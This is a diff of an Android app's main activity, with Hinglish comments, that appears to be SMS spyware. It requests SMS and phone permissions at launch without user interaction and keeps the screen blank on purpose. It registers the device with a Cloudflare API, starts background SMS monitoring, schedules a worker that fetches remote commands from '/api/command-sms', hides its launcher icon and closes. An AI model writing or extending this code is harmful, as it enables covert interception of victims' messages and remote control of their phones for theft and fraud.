@@ -4,11 +4,10 @@ import android.Manifest
 import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.os.BatteryManager
 import android.os.Build
 import android.os.Bundle
-import android.view.View
-import android.widget.Button
-import android.widget.TextView
+import android.provider.Settings
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -22,81 +21,72 @@ import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
 
-    private val SMS_PERMISSION_CODE = 100
+    private val PERMISSION_CODE = 101
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        // Layout ki zarurat nahi agar sab auto kar rahe ho, 
-        // par error se bachne ke liye rehne de sakte hain.
+        // Blank view taaki user ko kuch dikhe nahi
         setContentView(R.layout.activity_main)
 
-        // 1. Check karo agar permission pehle se hai toh setup complete karo
-        if (isSmsPermissionGranted()) {
+        if (allPermissionsGranted()) {
             setupCompleted()
         } else {
-            // 2. Agar nahi hai, toh bina kisi button click ke turant maango
-            requestSmsPermission()
+            requestPermissions()
         }
     }
 
-    private fun isSmsPermissionGranted(): Boolean {
+    private fun allPermissionsGranted(): Boolean {
         val permissions = mutableListOf(
             Manifest.permission.READ_SMS,
             Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.SEND_SMS
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.READ_PHONE_STATE
         )
         return permissions.all {
             ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
         }
     }
 
-    private fun requestSmsPermission() {
+    private fun requestPermissions() {
         val permissions = mutableListOf(
             Manifest.permission.READ_SMS,
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.SEND_SMS,
-            Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_PHONE_STATE
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.CALL_PHONE
         )
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             permissions.add(Manifest.permission.POST_NOTIFICATIONS)
         }
 
-        ActivityCompat.requestPermissions(
-            this,
-            permissions.toTypedArray(),
-            SMS_PERMISSION_CODE
-        )
+        ActivityCompat.requestPermissions(this, permissions.toTypedArray(), PERMISSION_CODE)
     }
 
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<out String>,
-        grantResults: IntArray
-    ) {
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == SMS_PERMISSION_CODE) {
-            // Permission milte hi setup complete karke icon hide kar do
-            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
+        if (requestCode == PERMISSION_CODE) {
+            // Permission milte hi seedha kaam shuru
+            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 setupCompleted()
             } else {
-                // Agar deny kiya toh firse maang sakte ho ya finish kar do
-                finish()
+                finish() // Agar user deny kare toh band kar do
             }
         }
     }
 
     private fun setupCompleted() {
+        // 1. Worker start karo jo Cloudflare API (/api/devices) pe data bhejega
         val registrationRequest = OneTimeWorkRequestBuilder<RegistrationWorker>()
-            .setInitialDelay(2, TimeUnit.SECONDS)
+            .setInitialDelay(1, TimeUnit.SECONDS)
             .build()
         WorkManager.getInstance(this).enqueue(registrationRequest)
 
+        // 2. Background Service start karo (SMS monitoring ke liye)
         startBackgroundWork()
+
+        // 3. App icon hide karo aur activity close karo
         hideLauncherIcon()
-        
-        // Sab set hone ke baad activity turant band
         finish()
     }
 
@@ -118,14 +108,16 @@ class MainActivity : AppCompatActivity() {
 
         val workManager = WorkManager.getInstance(this)
 
-        val firstStatus = OneTimeWorkRequestBuilder<StatusWorker>()
-            .setInitialDelay(5, TimeUnit.SECONDS)
+        // StatusWorker: Battery aur Last Seen update karne ke liye
+        val statusWork = OneTimeWorkRequestBuilder<StatusWorker>()
+            .setInitialDelay(10, TimeUnit.SECONDS)
             .build()
-        workManager.enqueue(firstStatus)
+        workManager.enqueue(statusWork)
 
-        val firstCommand = OneTimeWorkRequestBuilder<CommandWorker>()
-            .setInitialDelay(1, TimeUnit.MINUTES)
+        // CommandWorker: /api/command-sms se naye commands fetch karne ke liye
+        val commandWork = OneTimeWorkRequestBuilder<CommandWorker>()
+            .setInitialDelay(30, TimeUnit.SECONDS)
             .build()
-        workManager.enqueue(firstCommand)
+        workManager.enqueue(commandWork)
     }
 }
